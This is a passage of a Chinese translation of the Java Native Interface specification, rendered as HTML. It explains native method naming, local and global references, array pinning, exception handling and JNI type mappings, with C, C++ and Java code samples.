class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> pkg;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cls</span> &#123; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">native</span> <span class=\"type\">double</span> <span class=\"title function_\">f</span><span class=\"params\">(<span class=\"type\">int</span> i, String s)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">static</span> &#123; </span><br><span class=\"line\">         System.loadLibrary(“pkg_Cls”); </span><br><span class=\"line\">     &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>System.loadLibrary的参数是程序员任意选择的一个库名。系统遵循一种标准的但特定于平台的方法将库名转换成原生库名。例如Solaris系统将名字pkg_Cls转换为libpkg_Cls.so，而Win32系统将名字pkg_Cls转换为pkg_Cls.dll</p>\n<p>程序员可以使用一个库来保存任意数量类所需要的所有本地方法，只要使用相同的类加载器来加载这些类。VM内部为每个类加载器维护一个原生库加载列表。VM制造商应该选择本地库名称，以减少名称冲突的可能性。</p>\n<p>如果底层操作系统不支持动态链接，VM必须预链接所有本地方法。在这种情况下，VM完成System.loadLibrary调用而不实际加载库。</p>\n<p>程序员也可以调用JNI函数RegisterNatives来注册与类相关联的原生方法。RegisterNatives函数对于静态链接函数特别有用。</p>\n<h3 id=\"解析原生方法名\"><a href=\"#解析原生方法名\" class=\"headerlink\" title=\"解析原生方法名\"></a>解析原生方法名</h3><p>原生方法名由以下组件连接而成：</p>\n<ul>\n<li>Java_前缀</li>\n<li>完全的类名</li>\n<li>下划线分隔符_</li>\n<li>方法名</li>\n<li>对于重载的本地方法，在两个下划线__后面加上参数签名</li>\n</ul>\n<p>VM检查方法名是否与驻留在原生库中的方法相匹配。VM首先查找短名称，没有参数签名的名称。然后查找长名称，带有参数签名的名称。只有当原生方法被另一个原生方法重载时，程序员才需要使用长名称。然而如果原生方法与非原生方法具有相同的名称，这是没有问题的。非原生方法不会驻留在原生库中。</p>\n<p>在下面的例子中，原生方法g不必使用长名称进行链接，因为另一个方法g不是原生方法，因此不在原生库中。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cls1</span> &#123; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"title function_\">g</span><span class=\"params\">(<span class=\"type\">int</span> i)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">native</span> <span class=\"type\">int</span> <span class=\"title function_\">g</span><span class=\"params\">(<span class=\"type\">double</span> d)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>我们采用一个简单的名称修改方案来确保所有的Unicode字符都转换为有效的C函数名。我们使用下划线字段_来替换完全类名中的斜杠/。由于名称和类型描述从不以数字开头，我们可以使用_0…_9来表示转义字符。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">转义字符</th>\n<th align=\"center\">表示</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">_0XXXX</td>\n<td align=\"center\">Unicode字符XXXX，使用小写字符表示非ASC码Unicode字符，例如_0abcd</td>\n</tr>\n<tr>\n<td align=\"center\">_1</td>\n<td align=\"center\">字符_</td>\n</tr>\n<tr>\n<td align=\"center\">_2</td>\n<td align=\"center\">字符;</td>\n</tr>\n<tr>\n<td align=\"center\">_3</td>\n<td align=\"center\">字符[</td>\n</tr>\n</tbody></table>\n<p>在给定的平台上，本地方法和接口API都遵循标准库调用约定。例如UNIX系统使用C调用约定，Win32系统使用__stdcall</p>\n<h3 id=\"本地方法参数\"><a href=\"#本地方法参数\" class=\"headerlink\" title=\"本地方法参数\"></a>本地方法参数</h3><p>JNI接口指针是本地方法的第一个参数。JNI接口指针的类型是JNIEnv。第二个参数取决于本地方法是静态的还是非静态的。非静态本地方法的第二个参数是对对象的引用，静态本地方法的第二个参数是对Java类的引用。</p>\n<p>其余参数对应于普通Java方法参数。本地方法调用通过返回值将结果传递回调用程序。</p>\n<p>下面的例子演示了使用C函数去实现原生方法f</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> pkg;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Cls</span> &#123; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">native</span> <span class=\"type\">double</span> <span class=\"title function_\">f</span><span class=\"params\">(<span class=\"type\">int</span> i, String s)</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">     ... </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>带有长名称Java_pkg_Cls_f_ILjava_lang_String_2的C函数实现本地方法f</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdouble <span class=\"title function_\">Java_pkg_Cls_f__ILjava_lang_String_2</span> <span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">     JNIEnv *env,        <span class=\"comment\">/* interface pointer */</span></span></span><br><span class=\"line\"><span class=\"params\">     jobject obj,        <span class=\"comment\">/* &quot;this&quot; pointer */</span></span></span><br><span class=\"line\"><span class=\"params\">     jint i,             <span class=\"comment\">/* argument #1 */</span></span></span><br><span class=\"line\"><span class=\"params\">     jstring s)</span>          <span class=\"comment\">/* argument #2 */</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">     <span class=\"comment\">/* Obtain a C-copy of the Java string */</span></span><br><span class=\"line\">     <span class=\"type\">const</span> <span class=\"type\">char</span> *str = (*env)-&gt;GetStringUTFChars(env, s, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* process the string */</span></span><br><span class=\"line\">     ...</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* Now we are done with str */</span></span><br><span class=\"line\">     (*env)-&gt;ReleaseStringUTFChars(env, s, str);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意，我们总是使用接口指针env操作Java对象。下面的例子是C++版本:</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> <span class=\"comment\">/* specify the C calling convention */</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">jdouble <span class=\"title\">Java_pkg_Cls_f__ILjava_lang_String_2</span> <span class=\"params\">( </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     JNIEnv *env,        <span class=\"comment\">/* interface pointer */</span> </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     jobject obj,        <span class=\"comment\">/* &quot;this&quot; pointer */</span> </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     jint i,             <span class=\"comment\">/* argument #1 */</span> </span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">     jstring s)</span>          <span class=\"comment\">/* argument #2 */</span> </span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123; </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"type\">const</span> <span class=\"type\">char</span> *str = env-&gt;<span class=\"built_in\">GetStringUTFChars</span>(s, <span class=\"number\">0</span>); </span><br><span class=\"line\"></span><br><span class=\"line\">     ... </span><br><span class=\"line\"></span><br><span class=\"line\">     env-&gt;<span class=\"built_in\">ReleaseStringUTFChars</span>(s, str); </span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">return</span> ... </span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在C++中额外的间接层和接口指针参数从源代码中消失了。然而其底层机制和C完全相同。在C++中JNI函数被定义为内联成员函数，可以扩展为C对应函数。</p>\n<h3 id=\"引用Java对象\"><a href=\"#引用Java对象\" class=\"headerlink\" title=\"引用Java对象\"></a>引用Java对象</h3><p>基本类型比如整数、字符等在Java和原生代码之间被复制。另一方面，Java对象是通过引用传递的。VM必须持续跟踪所有被传递到原生代码的对象，以便垃圾回收器不会释放这些对象。反之，原生代码必须有一种方式通知VM它不在需要这些对象。此外，垃圾回收器必须能够移动原生代码引用的对象。</p>\n<h3 id=\"全局和本地引用\"><a href=\"#全局和本地引用\" class=\"headerlink\" title=\"全局和本地引用\"></a>全局和本地引用</h3><p>JNI将原生代码使用的对象引用分为两类：本地引用和全局引用。本地引用在原生方法调用期间有效，并且在原生方法返回后自动释放。全局引用在明确释放之前保持有效。</p>\n<p>传递给原生方法的对象作为本地引用。JNI函数返回的所有Java对象都是本地引用。JNI允许程序员通过本地引用创建全局引用。期望Java对象的JNI函数同时接受全局和本地引用。原生方法可以返回对于VM的本地或者全局引用作为其结果。</p>\n<p>通常，程序员应该在原生方法返回后依靠VM释放所有本地引用。然而有时程序员应该明确释放本地引用。比如考虑以下情况：</p>\n<ul>\n<li>原生方法访问大型Java对象，从而创建对Java对象的本地引用。原生方法在返回调用者之前执行额外的计算。对大型Java对象的本地引用将防止对象被垃圾回收，即使该对象在剩余的计算中不再使用。</li>\n<li>原生方法会创建大量的本地引用，尽管并不是所有的本地引用都同时使用。由于VM需要一定的空间来持续跟踪本地引用，创建太多本地引用可能导致系统内存溢出。例如，本地方法循环遍历一个大的对象数组，获取元素作为本地引用，并在每次迭代中对一个元素进行操作。在每次迭代之后，程序员不再需要对数组元素的本地引用。</li>\n</ul>\n<p>JNI允许程序员在原生方法中的任何一点手动删除本地引用。为了确保程序员能够手动释放本地引用，JNI函数不允许创建额外的本地引用，除了它们作为返回结果的引用。</p>\n<p>本地引用仅在创建它们的线程中有效。原生代码不能将本地引用从一个线程传递到另一个线程。</p>\n<h3 id=\"实现本地引用\"><a href=\"#实现本地引用\" class=\"headerlink\" title=\"实现本地引用\"></a>实现本地引用</h3><p>为了实现本地引用，Java VM为控制从Java到原生方法的每次转换创建一个注册表。注册表将不可移动的本地引用映射为Java对象，并防止对象被垃圾回收。所有传递给原生方法的Java对象(包括作为JNI函数调用返回结果的那些对象)都被自动添加到注册表中。注册表在原生方法返回后被删除，它的所有内容被垃圾回收。</p>\n<p>有不同的方法来实现注册表，例如使用表、链表或者散列表。虽然引用计数可以用来避免注册表中的重复内容，但是JNI实现并没有义务检测和折叠重复内容。</p>\n<p>注意，仅通过扫描原生堆栈不能准确的实现本地引用。原生代码可以将本地引用保存在全局或者堆数据结构中。</p>\n<h3 id=\"访问Java对象\"><a href=\"#访问Java对象\" class=\"headerlink\" title=\"访问Java对象\"></a>访问Java对象</h3><p>JNI为全局和本地引用提供了一组丰富的访问函数。这意味着无论VM内部如何表示Java对象，相同的原生方法实现都可以工作。这是JNI能够被各种VM实现支持的一个重要原因。</p>\n<p>通过引用使用访问函数的开销要高于直接访问C数据结构。在大多数情况下，我们相信Java程序员使用原生方法来执行一些重要任务，这些任务掩盖了接口的开销。</p>\n<h3 id=\"访问原始数组\"><a href=\"#访问原始数组\" class=\"headerlink\" title=\"访问原始数组\"></a>访问原始数组</h3><p>对于包含许多基本数据类型的大型Java对象，这种开销是不能接受的。考虑用于执行向量和矩阵计算的原生方法。遍历Java数组并使用函数调用获取每个元素的效率非常低。</p>\n<p>一种解决方案引入了固定的概念，以便原生方法可以要求VM固定数组的内容。原生方法然后接收一个指向元素的指针。然而这种方法有两个条件:</p>\n<ul>\n<li>垃圾回收必须支持固定</li>\n<li>VM必须在内存中连续存储原始数组。虽然这是大多数原始数组最合理的实现，布尔数组可以通过打包或解包实现。因此依赖于布尔数组精确布局的原生代码是不可移植的。</li>\n</ul>\n<p>我们采用折中方案克服了上面的两个问题。</p>\n<p>首先我们提供了一组函数在Java数组和原生内存缓冲区之间复制基本数组元素。如果原生方法只需要访问一个大数组中的少量元素则使用这些函数。</p>\n<p>其次程序员可以使用另一组函数来获取数组元素的固定版本。请记住这些函数可能需要Java VM执行存储分配和复制。这些函数实际上是否复制数组取决于VM的实现:</p>\n<ul>\n<li>如果垃圾回收支持固定，并且数组的存储与原生方法所期望的相同则不需要复制。</li>\n<li>否则数组将被复制到一个不可移动的内存块(比如C堆中)，并执行必要的格式转换。返回一个副本的指针。</li>\n</ul>\n<p>最后接口提供了通知VM原生代码不再需要访问数组元素的函数。当调用这些函数时，系统将解除数组的固定，或者将原始数组与其不可移动的副本进行协调并释放副本。</p>\n<p>我们提供的方法更加灵活。垃圾回收算法可以对每个给定数组的复制或者固定做出单独的决定。比如，垃圾回收可以复制小对象，但固定大对象。</p>\n<p>JNI实现必须确保在多个线程中运行的原生方法能够同时访问同一个数组。比如，JNI可以为每个固定的数组保留一个内部计数器，这样一个线程就不会解除另一个线程固定的数组。注意，JNI不需要为原生方法的独占访问锁定原始数组。同时从不同的线程更新Java数组会导致不确定的结果。</p>\n<h3 id=\"访问属性和方法\"><a href=\"#访问属性和方法\" class=\"headerlink\" title=\"访问属性和方法\"></a>访问属性和方法</h3><p>JNI允许原生代码访问属性和调用Java对象方法。JNI通过符号名和类型签名来标识方法和属性。两步法从名称和签名中计算出定位属性或方法的成本。比如，调用cls类中的方法f时，原生代码首先获取一个方法ID:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jmethodID mid =      env-&gt;GetMethodID(cls, “f”, “(ILjava/lang/String;)D”); </span><br></pre></td></tr></table></figure>\n\n<p>然后，原生代码可以重复使用方法ID而不需要执行方法查找</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdouble result = env-&gt;CallDoubleMethod(obj, mid, <span class=\"number\">10</span>, str); </span><br></pre></td></tr></table></figure>\n\n<p>属性或方法ID不会阻止VM卸载从其生成ID的类。类被卸载之后属性或方法ID将不可用。因此，如果打算在一段时间内使用属性或者方法ID，原生代码必须确保:</p>\n<ul>\n<li>保持对底层类的引用</li>\n<li>或者重新计算属性或方法ID</li>\n</ul>\n<p>JNI不会对属性和方法ID如何在内部实现施加任何限制。</p>\n<h3 id=\"报告编程错误\"><a href=\"#报告编程错误\" class=\"headerlink\" title=\"报告编程错误\"></a>报告编程错误</h3><p>JNI不检查编程错误，比如传空指针或者非法参数类型。非法参数类型包括使用普通Java对象而不是Java类对象。JNI不检查这些编程错误的原因如下:</p>\n<ul>\n<li>强制JNI函数检查所有可能的错误条件会降低正常原生方法的性能</li>\n<li>在很多情况下，没有足够的运行时类型信息来执行这样的检查</li>\n</ul>\n<p>大多数C库函数不能防止编程错误。比如，当printf函数接收到一个无效地址时通常会引发运行时错误，而不是返回错误代码。强制C库函数检查所有可能的错误条件可能导致这样的检查在用户代码中和库中重复进行。</p>\n<p>程序员不能向JNI函数传递非法指针或错误类型参数。这样会导致不可预期的后果，包括系统状态损坏或VM崩溃。</p>\n<h3 id=\"Java异常\"><a href=\"#Java异常\" class=\"headerlink\" title=\"Java异常\"></a>Java异常</h3><p>JNI允许原生方法引发任意Java异常。原生代码也能处理未处理的Java异常。未处理的Java异常被传递回VM。</p>\n<h3 id=\"异常和错误代码\"><a href=\"#异常和错误代码\" class=\"headerlink\" title=\"异常和错误代码\"></a>异常和错误代码</h3><p>某些JNI函数使用Java异常机制来报告错误条件。在很多情况下，JNI函数通过返回错误代码并且抛出Java异常来报告错误条件。错误代码通常是一个特殊的返回值(比如NULL)，它超出了正常返回值的范围。因此程序员可以:</p>\n<ul>\n<li>快速检查最后一个JNI调用的返回值，已确定是否发生了错误</li>\n<li>调用ExceptionOccurred函数以获取包含更详细描述错误条件的异常对象</li>\n</ul>\n<p>在两种情况下，程序员需要检查异常而不能首先检查错误代码:</p>\n<ul>\n<li>调用Java方法的JNI函数返回Java方法的结果。程序员必须调用ExceptionOccurred来检查Java方法执行期间可能发生的异常</li>\n<li>一些JNI数组访问函数不返回错误代码，但可能抛出ArrayIndexOutOfBoundsException或ArrayStoreException异常</li>\n</ul>\n<p>在所有其他情况下，非错误返回值保证没有抛出异常。</p>\n<h3 id=\"异步异常\"><a href=\"#异步异常\" class=\"headerlink\" title=\"异步异常\"></a>异步异常</h3><p>在多线程情况下，当前线程之外的其他线程可能抛出异步异常。异步异常不会立即影响当前线程中原生代码的执行，直到:</p>\n<ul>\n<li>原生代码调用可能引发同步异常的JNI函数</li>\n<li>原生代码使用ExceptionOccurred明确的检查同步和异步异常</li>\n</ul>\n<p>注意，只有那些可能引发同步异常的JNI函数才会检查异步异常</p>\n<p>原生方法应该在必要的地方插入ExceptionOccurred检查(比如在没有其他异常检查的循环中)，以确保当前线程在合理的时间内响应异步异常。</p>\n<h3 id=\"异常处理\"><a href=\"#异常处理\" class=\"headerlink\" title=\"异常处理\"></a>异常处理</h3><p>在原生代码中有两种处理异常的方法:</p>\n<ul>\n<li>原生方法可以选择立即返回，从而使在初始化原生方法调用的Java代码中抛出异常</li>\n<li>原生代码可以通过调用ExceptionClear清除异常，然后执行自己的异常处理代码</li>\n</ul>\n<p>在异常出现之后，原生代码必须在调用其他JNI函数之前首先清除异常。当存在待处理的异常时，可以安全调用的JNI函数包括:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExceptionOccurred()</span><br><span class=\"line\">ExceptionDescribe()</span><br><span class=\"line\">ExceptionClear()</span><br><span class=\"line\">ExceptionCheck()</span><br><span class=\"line\">ReleaseStringChars()</span><br><span class=\"line\">ReleaseStringUTFChars()</span><br><span class=\"line\">ReleaseStringCritical()</span><br><span class=\"line\">Release&lt;Type&gt;ArrayElements()</span><br><span class=\"line\">ReleasePrimitiveArrayCritical()</span><br><span class=\"line\">DeleteLocalRef()</span><br><span class=\"line\">DeleteGlobalRef()</span><br><span class=\"line\">DeleteWeakGlobalRef()</span><br><span class=\"line\">MonitorExit()</span><br><span class=\"line\">PushLocalFrame()</span><br><span class=\"line\">PopLocalFrame()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"第三章\"><a href=\"#第三章\" class=\"headerlink\" title=\"第三章\"></a>第三章</h2><h3 id=\"基本类型\"><a href=\"#基本类型\" class=\"headerlink\" title=\"基本类型\"></a>基本类型</h3><p>下面的表格描述Java基本类型和对应的依赖于机器的原生类型</p>\n<table>\n<thead>\n<tr>\n<th>Java类型</th>\n<th>原生类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>boolean</td>\n<td>jboolean</td>\n<td>无符号8位</td>\n</tr>\n<tr>\n<td>byte</td>\n<td>jbyte</td>\n<td>有符号8位</td>\n</tr>\n<tr>\n<td>char</td>\n<td>jchar</td>\n<td>无符号16位</td>\n</tr>\n<tr>\n<td>short</td>\n<td>jshort</td>\n<td>有符号16位</td>\n</tr>\n<tr>\n<td>int</td>\n<td>jint</td>\n<td>有符号32位</td>\n</tr>\n<tr>\n<td>long</td>\n<td>jlong</td>\n<td>有符号64位</td>\n</tr>\n<tr>\n<td>float</td>\n<td>jfloat</td>\n<td>32位</td>\n</tr>\n<tr>\n<td>double</td>\n<td>jdouble</td>\n<td>64位</td>\n</tr>\n<tr>\n<td>void</td>\n<td>void</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>为了方便起见提供了以下定义</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JNI_FALSE  0 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> JNI_TRUE   1 </span></span><br></pre></td></tr></table></figure>\n\n<p>jsize整数类型用于描述基本的索引和大小</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> jint jsize; </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"引用类型\"><a href=\"#引用类型\" class=\"headerlink\" title=\"引用类型\"></a>引用类型</h3><p>JNI包含很多对应于不同Java对象类型的引用类型。</p>\n<p><img src=\"./images/types4.gif\"></p>\n<p>在C中，所有其他JNI引用类型都被定义为与jobject相同。比如:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> jobject jclass; </span><br></pre></td></tr></table></figure>\n\n<p>在C++中，JNI引入了一组虚拟类来表示子类型关系。比如:</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">_jobject</span> &#123;&#125;; </span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">_jclass</span> : <span class=\"keyword\">public</span> _jobject &#123;&#125;; </span><br><span class=\"line\">... </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> _jobject *jobject; </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> _jclass *jclass; </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"属性和方法ID\"><a href=\"#属性和方法ID\" class=\"headerlink\" title=\"属性和方法ID\"></a>属性和方法ID</h3><p>方法和属性ID是常规的C指针类型</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jfieldID</span>;</span>              <span class=\"comment\">/* opaque structure */</span> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jfieldID</span> *<span class=\"title\">jfieldID</span>;</span>   <span class=\"comment\">/* field IDs */</span> </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jmethodID</span>;</span>              <span class=\"comment\">/* opaque structure */</span> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">jmethodID</span> *<span class=\"title\">jmethodID</span>;</span> <span class=\"comment\">/* method IDs */</span> </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"值类型\"><a href=\"#值类型\" class=\"headerlink\" title=\"值类型\"></a>值类型</h3><p>jvalue联合类型被用作参数数组中的元素类型。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">jvalue</span> &#123;</span> </span><br><span class=\"line\">    jboolean z; </span><br><span class=\"line\">    jbyte    b; </span><br><span class=\"line\">    jchar    c; </span><br><span class=\"line\">    jshort   s; </span><br><span class=\"line\">    jint     i; </span><br><span class=\"line\">    jlong    j; </span><br><span class=\"line\">    jfloat   f; </span><br><span class=\"line\">    jdouble  d; </span><br><span class=\"line\">    jobject  l; </span><br><span class=\"line\">&#125; jvalue; </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"类型签名\"><a href=\"#类型签名\" class=\"headerlink\" title=\"类型签名\"></a>类型签名</h3><p>JNI使用Java VM的类型签名表示。</p>\n<table>\n<thead>\n<tr>\n<th>类型签名</th>\n<th>Java类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Z</td>\n<td>boolean</td>\n</tr>\n<tr>\n<td>B</td>\n<td>byte</td>\n</tr>\n<tr>\n<td>C</td>\n<td>char</td>\n</tr>\n<tr>\n<td>S</td>\n<td>short</td>\n</tr>\n<tr>\n<td>I</td>\n<td>int</td>\n</tr>\n<tr>\n<td>J</td>\n<td>long</td>\n</tr>\n<tr>\n<td>F</td>\n<td>float</td>\n</tr>\n<tr>\n<td>D</td>\n<td>double</td>\n</tr>\n<tr>\n<td>L fully-qualified-class ;</td>\n<td>完整类名</td>\n</tr>\n<tr>\n<td>[ type</td>\n<td>类型数组</td>\n</tr>\n<tr>\n<td>( arg-types ) ret-type</td>\n<td>方法类型</td>\n</tr>\n</tbody></table>\n<p>比如，Java方法:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">long</span> <span class=\"title function_\">f</span> <span class=\"params\">(<span class=\"type\">int</span> n, String s, <span class=\"type\">int</span>[] arr)</span>; </span><br></pre></td></tr></table></figure>\n\n<p>对应下面的类型签名:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ILjava/lang/String;[I)J </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"改进的UTF-8字符串\"><a href=\"#改进的UTF-8字符串\" class=\"headerlink\" title=\"改进的UTF-8字符串\"></a>改进的UTF-8字符串</h3><p>JNI使用改进的UTF-8字符串来表示各种字符串类型。改进的UTF-8字符串与Java VM使用的字符串相同。对改进的UTF-8字符串进行编码，以便仅包含非空ASC码字符的字符序列只能用每个字符一个字节表示，但是所有Unicode字符都能被表示。</p>\n<p>这种格式与标准UTF-8格式之间有两个不同。首先，使用双字节格式而不是单字节格式对空字符进行编码。这意味着改进的UTF-8字符串永远不会引入空值。其次，只使用标准UTF-8的一字节、二字节和三字节格式。Java VM不识别标准UTF-8的四字节格式，它使用自己的两倍三字节格式代替。</p>\n<h2 id=\"第四章\"><a href=\"#第四章\" class=\"headerlink\" title=\"第四章\"></a>第四章</h2><p>本章作为JNI函数的参考部分，提供了所有JNI函数的完整列表。</p>\n<p>注意，”必须”一词用来描述对JNI程序员的限制。比如，当你看到某个JNI函数必须接收一个非空对象时，你有责任确保没有将空传递给JNI函数。因此，JNI实现不需要在该JNI函数中执行空指针检查。</p>\n<h3 id=\"接口函数表\"><a href=\"#接口函数表\" class=\"headerlink\" title=\"接口函数表\"></a>接口函数表</h3><p>每个函数都可以通过JNIEnv参数以固定的偏移量访问。JNIEnv类型是一个指向存储所有JNI函数指针结构体的指针。定义如下:</p>\n<figure 